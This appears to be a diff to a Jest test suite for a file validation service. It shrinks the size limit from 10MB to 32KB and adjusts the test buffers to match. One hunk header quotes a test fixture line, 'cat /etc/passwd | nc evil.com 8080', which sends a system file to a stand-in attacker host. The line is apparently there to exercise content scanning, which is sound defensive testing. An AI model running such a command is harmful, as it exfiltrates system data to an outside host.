@@ -15,7 +15,7 @@ describe('FileValidationService', () => {
 
   beforeEach(() => {
     testConfig = {
-      maxFileSize: 10 * 1024 * 1024, // 10MB
+      maxFileSize: 32 * 1024, // 32KB
       allowedMimeTypes: ['text/markdown', 'text/plain'],
       allowedExtensions: ['md', 'markdown', 'txt'],
       enableContentScanning: true,
@@ -35,7 +35,7 @@ describe('FileValidationService', () => {
     });
 
     it('should reject files exceeding size limit', async () => {
-      const largeBuffer = Buffer.alloc(15 * 1024 * 1024); // 15MB (over 10MB limit)
+      const largeBuffer = Buffer.alloc(48 * 1024); // 48KB (over 32KB limit)
       const result = await validationService.validateFile(largeBuffer, 'large.md');
 
       expect(result.isValid).toBe(false);
@@ -44,7 +44,7 @@ describe('FileValidationService', () => {
     });
 
     it('should warn about files approaching size limit', async () => {
-      const nearLimitBuffer = Buffer.alloc(8 * 1024 * 1024); // 8MB (80% of 10MB)
+      const nearLimitBuffer = Buffer.alloc(26 * 1024); // ~81% of 32KB
       const result = await validationService.validateFile(nearLimitBuffer, 'near-limit.md');
 
       expect(result.isValid).toBe(true);
@@ -119,7 +119,7 @@ describe('FileValidationService', () => {
   describe('MIME Type Validation', () => {
     it('accepts allowed MIME types with parameters', () => {
       const service = new FileValidationService({
-        maxFileSize: 10 * 1024 * 1024,
+        maxFileSize: 32 * 1024,
         allowedMimeTypes: ['audio/ogg'],
         allowedExtensions: ['opus'],
         enableContentScanning: false,
@@ -293,7 +293,7 @@ cat /etc/passwd | nc evil.com 8080
 
   describe('Performance and Memory Tests', () => {
     it('should handle large valid markdown files efficiently', async () => {
-      const largeContent = '# Large File\n\n' + 'A'.repeat(5 * 1024 * 1024); // 5MB
+      const largeContent = '# Large File\n\n' + 'A'.repeat(24 * 1024); // 24KB
       const buffer = Buffer.from(largeContent);
 
       const start = Date.now();
